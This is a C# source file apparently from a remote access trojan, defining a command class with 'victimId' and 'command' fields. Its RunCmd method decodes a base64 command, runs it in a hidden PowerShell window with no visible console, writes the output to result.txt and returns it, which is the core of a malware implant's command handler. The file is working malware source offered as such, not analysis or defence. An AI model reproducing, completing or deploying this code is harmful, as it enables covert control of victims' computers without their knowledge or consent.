using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;


namespace PaceMain
{
    public class Cmd
    {
        public string commandId { get; set; }
        public string victimId { get; set; }
        public string command { get; set; }
        public bool active { get; set; }

        
        public string RunCmd()
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            process.Start();
            process.StandardInput.WriteLine(B64.b64Decode(command) + " > result.txt");
            process.StandardInput.Flush();
            process.StandardInput.Close();
            process.WaitForExit();

            if (File.Exists("result.txt"))
            {

                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
                // read everything from file
                string result = sr.ReadToEnd();

                sr.Close();

                return result;

            }
            else
            {
                return "result file not created !";
            }
        }

        

        public string DecryptCmd(string cmd)
        {
            // to be implemented
            return cmd;

        }
    }
}
